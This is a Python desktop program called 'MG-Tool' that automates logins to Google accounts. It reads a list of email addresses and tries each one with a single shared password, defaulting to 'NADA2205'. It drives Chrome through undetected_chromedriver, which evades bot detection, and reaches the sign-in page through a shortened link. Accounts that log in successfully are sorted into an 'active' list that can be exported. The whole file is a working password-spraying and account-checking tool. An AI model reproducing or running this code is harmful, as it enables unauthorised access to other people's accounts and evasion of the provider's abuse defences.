import time
from selenium.webdriver.common.by import By
import undetected_chromedriver as uc
from PyQt5 import QtWidgets, uic
from PyQt5.QtWidgets import *
#QClipboard
from winotify import Notification

from PyQt5.QtGui import QPixmap,QIcon
from PyQt5.QtCore import Qt
import sys
import webbrowser
import os
from threading import Thread

class MainWindow(QMainWindow):
    def __init__(self):
        super(MainWindow,self).__init__()
        #self.setupUi(self)
                
        uic.loadUi('ui/main.ui', self)
        self.setWindowTitle("MG-Tool")

        self.init_ui()

    def init_ui(self):
        self.lineEdit.setText("NADA2205")
        self.emails = []
        self.num_email = 0
        self.passwords = []
        self.password = ""
        self.dc = {}
        
        self.list_widget = self.listWidget
        self.pushButton.clicked.connect(self.open_file)
        self.pushButton_2.clicked.connect(self.delete_row_in_home)
        self.pushButton_4.clicked.connect(lambda:Thread(target=self.open_br).start())
        self.pushButton_5.clicked.connect(lambda:Thread(target=self.start).start())
        self.pushButton_6.clicked.connect(lambda:self.export_to_txt("active"))
        self.pushButton_11.clicked.connect(lambda:self.export_to_txt("bad"))
        self.pushButton_3.clicked.connect(lambda:self.clear_list("home"))
        self.pushButton_7.clicked.connect(lambda:self.clear_list("active"))
        self.pushButton_10.clicked.connect(lambda:self.clear_list("bad"))
        self.pushButton_14.clicked.connect(self.exit_app)


        #clear_list

        #تجريبي
        #pushButton_12
        self.pushButton_12.clicked.connect(self.test)

        self.open_file()
    def start(self):
        cunt = 0
        print("test")
        rows_count = self.list_widget.count()
        print("عدد الصفوف في QListWidget:", rows_count)
        cunt =+ rows_count
        ################
        #"""
        for i in range(rows_count+1):
            #"""
            get_pass = str(self.lineEdit.text())
            get_pass.replace(" ","")
            email = self.get_first_value()
            try:
                email.replace(" ","")
            except:
                print("Erorr the email.replace")
            ########################
            
            self.label_6.setText(f"مجموع الحسابات: {rows_count}")
            #print("*"*40)
            print(f"Email: {email}, passwprd: {get_pass}")
            self.login(email,get_pass)
            self.label_5.setText(f"بدء {str(1+i)} من {rows_count}")

            print(f"Account Num ({str(1+i)}) from ({str(rows_count)})")
            print("*"*40)
            
            self.delete_row_in_home()
            print(rows_count , i)
            
            if rows_count == 1+i:
                self.driver.quit()
                #self.driver.close()
                self.label_7.setText("المتصفح مغلق")
                #self.label_7.setStyleSheet("")
                self.show_msg()
                break
            #"""
            
                    
         
            

                
                
                
                
        #"""
    
    def show_msg(self):
        toast = Notification(app_id="مرحباً",
        title="تم الانتهاء",
        msg="تم الإنتهاء من الفحص")
        toast.show()

    
    
    def exit_app(self):
        print("Exit")
        try:
            self.driver.quit()
        except:
            pass
        self.close()
        sys.exit()
    #استخراج الملفات
    def export_to_txt(self,name_file):
        # الحصول على مسار الملف المستهدف
        if name_file == "active":
            file_dialog = QFileDialog()
            file_path, _ = file_dialog.getSaveFileName(self, "حفظ في ملف نصي", "Active_accounts.txt", "ملفات النص (*.txt)")

            if file_path:
                try:
                    # فتح الملف للكتابة
                    with open(file_path, 'w',encoding='utf-8') as file:
                        # كتابة النصوص إلى الملف
                        for i in range(self.listWidget_2.count()):
                            file.write(self.listWidget_2.item(i).text() + '\n')

                    print("تم حفظ النصوص في الملف بنجاح.")
                except Exception as e:
                    print(f"حدث خطأ أثناء حفظ الملف: {e}")
        elif name_file == "bad":
            file_dialog = QFileDialog()
            file_path, _ = file_dialog.getSaveFileName(self, "حفظ في ملف نصي", "Bad_active.txt", "ملفات النص (*.txt)")

            if file_path:
                try:
                    # فتح الملف للكتابة
                    with open(file_path, 'w',encoding='utf-8') as file:
                        # كتابة النصوص إلى الملف
                        for i in range(self.listWidget_3.count()):
                            file.write(self.listWidget_3.item(i).text() + '\n')

                    print("تم حفظ النصوص في الملف بنجاح.")
                except Exception as e:
                    print(f"حدث خطأ أثناء حفظ الملف: {e}")

    def check_word(self,target_word,booll_active):
        #target_word = self.search_input.text()
        if booll_active == True:
            if target_word:
                # تحقق مما إذا كانت الكلمة موجودة في QListWidget
                found = any(target_word in self.listWidget_2.item(i).text() for i in range(self.listWidget_2.count()))
                # إعادة "نعم" إذا كانت الكلمة موجودة وإعادة "لا" إذا لم تكن موجودة    
                if found:
                    print("found")
                    pass
                else:
                    #print("n")
                    self.listWidget_2.addItem(f"{target_word}")
                    print(f"Add Accounts Active: {target_word}")
        
        # لو معطل
        if booll_active == False:
            if target_word:
                # تحقق مما إذا كانت الكلمة موجودة في QListWidget
                found = any(target_word in self.listWidget_3.item(i).text() for i in range(self.listWidget_3.count()))
                # إعادة "نعم" إذا كانت الكلمة موجودة وإعادة "لا" إذا لم تكن موجودة    
                if found:
                    print("found bad")
                    pass
                else:
                    #print("n")
                    self.listWidget_3.addItem(f"{target_word}")
                    print(f"send bad fuond: {target_word}")

        

        

      
    def clear_list(self,name):
        if name == "home":
            # حذف جميع العناصر من QListWidget
            if self.list_widget.count() > 0:
                self.list_widget.clear()
                print("Done clear home")
        if name == "active":
            # حذف جميع العناصر من QListWidget
            if self.listWidget_2.count() > 0:
                self.listWidget_2.clear()
                print("Done clear active")
        if name == "bad":
            # حذف جميع العناصر من QListWidget
            if self.listWidget_3.count() > 0:
                self.listWidget_3.clear()
                print("Done clear bad")
        

    def delete_row_in_home(self):
        # التأكد من وجود عناصر في القائمة
        if self.list_widget.count() > 0:
            # حذف القيمة الأولى
            first_item = self.list_widget.item(0)
            self.list_widget.takeItem(self.list_widget.row(first_item))
            print("تم حذف القيمة الأولى")
        else:
            print("القائمة فارغة")
    #############################
    #"""
    def test(self):

        self.show_msg() 
    #"""
    def get_first_value(self):
        
        # التأكد من وجود عناصر في القائمة
        if self.list_widget.count() > 0:
            # الحصول على القيمة الأولى
            first_value = self.list_widget.item(0).text()
            #print("القيمة الأولى:", first_value)
            return first_value
        else:
            print("القائمة فارغة")
        


    
        

    def login(self,email,passwd):
        self.url = "https://bit.ly/3t1G6fz"
        self.driver.get(self.url)
        #email
        time.sleep(5)
        self.driver.find_element(By.ID, "identifierId").send_keys(email)
        #next
        time.sleep(1)
        try:
            self.driver.find_element(By.XPATH, "//span[text()='Next']").click()
            

        except:
            pass
        try:
            self.driver.find_element(By.XPATH, "//span[text()='التالي']").click()
            
        except:
            pass

        
    
        #####################


        
        ##############################################################
        #password
        time.sleep(4)
        try:
            self.driver.find_element(By.NAME, "password").send_keys(passwd)
            
        except Exception as e:
            pass
        try:
            self.driver.find_element(By.NAME, "Passwd").send_keys(passwd)
            
        except Exception as e:
            pass
        #############
        try:
            self.driver.find_element(By.XPATH, "//span[text()='Next']").click()
            
        except:
            pass
        try:
            self.driver.find_element(By.XPATH, "//span[text()='التالي']").click()
            

            
        except:
            pass
        
        time.sleep(3)
        self.driver.refresh()
        time.sleep(1)
        page_text = self.driver.page_source


        


        ############################################
        

        #"يمكنك إدارة المعلومات والخصوصية والأمان للاستفادة من"
        #"لم يتمّ العثور على حسابك على Google."
        if "يمكنك إدارة المعلومات والخصوصية والأمان للاستفادة من" in page_text:
            print("موجود مرحباً حساب نشط")
            ############
            #التاكد اذا كان الحساب موجود 
            self.check_word(email,True)
            #self.create_file_accounts_active(email)
            print(f"Add Accounts Active: {email}")
            page_text = ""
            time.sleep(3)
                    
                
            

            #تسجيل الخروج
            #"""
            try:
                #self.driver.execute_script("document.getElementById('h-recaptcha-response').style = 'width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px;';")
                #print("Done i'm not reboot")
                #self.driver.find_element(By.CSS_SELECTOR, ".gb_b .gb_d").click()
                self.driver.get("https://accounts.google.com/Logout?ec=GAdAwAE&hl=ar")
                #CSS_SELECTOR
            except:
                pass
            #"""

        else:
            self.check_word(email,False)
            #self.create_file_accounts_active(email)
            #self.create_file_accounts_bad_active(email)
            print(f"bad: {email}")
            page_text = ""
            self.driver.get(self.url)
                    

        ###########################################
    """
    def create_file_accounts_active(self,email):
        filename = "Active_accounts.txt"
        if not os.path.exists(filename):
            with open(filename, 'w',encoding='utf-8') as file:
                file.write(email + "\n")
                #file.write(password + "\n")
            file.close()
        else:
            with open(filename, 'a',encoding='utf-8') as f:
                f.write("\n" + email)
                f.close()
         
    def create_file_accounts_bad_active(self,email):
        filename = "Bad_active.txt"
        if not os.path.exists(filename):
            with open(filename, 'w',encoding='utf-8') as file:
                file.write(email + "\n")
                #file.write(password + "\n")
            file.close()
        else:
            with open(filename, 'a',encoding='utf-8') as f:
                f.write("\n" + email)
                f.close()
    
    
    def get_password_in_file(self):
        filename = 'password.txt'
        if not os.path.exists(filename):
            with open('password.txt', 'w') as f:
                f.write("12345678")
     

            with open('password.txt', 'r') as r:
                first_line = r.readline()
                self.password = first_line.replace(" ","")
                

        else:
            with open('password.txt', 'r') as f:
                first_line = f.readline()
                self.password = first_line.replace(" ","")
                
                
        return first_line
    

    def get_email_and_pass(self,num_email):
        #محاوله انشاء ملف جديد
        filename = 'Email.txt'
        if not os.path.exists(filename):
            with open(filename, 'w') as file:
                file.write('name@gmail.com 12345678')
                print(f'The file {filename} was created successfully.')
        else:
            #print(f'The file {filename} already exists.')
            pass
        ###############################################################
        with open('Email.txt', 'r') as file:
            # Read lines from the file
            lines = file.readlines()
            # Print each line
            # قوائم لتخزين البريد الإلكتروني وكلمات المرور
        
        
        # فصل البريد الإلكتروني وكلمات المرور

        for line in lines:
            if len(line.strip().split()) >= 1:
                email = line.strip()  # قم بتغيير الفاصل إذا كان يستخدم حرفاً آخر
                
                self.emails.append(email.replace(" ",""))
                self.passwords.append(self.password)
                
                

            else:
                #print(f"خطأ في السطر: {line.strip()}")
                pass
    """
    def open_br(self):
        self.label_7.setText("المتصفح يعمل")
        self.options = uc.ChromeOptions()
        self.options.headless = False
                # stop msg
        #options.add_argument("argument")
        #prefs = {"credentials_enable_service": False,
                #"profile.password_manager_enabled": False,
                #"profile.default_content_setting_values.notifications" : 2}
        #options.add_experimental_option("prefs",prefs)
        self.driver = uc.Chrome(options = self.options)
        self.label_7.setStyleSheet("color:green")
    """
    def len_email(self):
        try:
            with open('Email.txt', 'r') as f:
                lines = f.readlines()
            self.num_email = int(len(lines))
        except Exception as e:
            print("Erorr fun > len_email")
    """


    def open_file(self):
        self.clear_list("home")
        file_dialog = QFileDialog()
        file_path, _ = file_dialog.getOpenFileName(self, "فتح ملف نصي", "Email.txt", "ملفات النص (*.txt)")

        if file_path:
            with open(file_path, 'r',encoding='utf-8') as file:
                content = file.readlines()

                # قم بتنظيف المحتوى من أي فراغات أو أسطر فارغة
                content = [line.strip() for line in content if line.strip()]

                # قم بإضافة الأسطر إلى QListWidget
                self.list_widget.addItems(content)

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    #app.setStyleSheet(stylesheet)
    window = MainWindow()
    window.show()
    app.exec_()
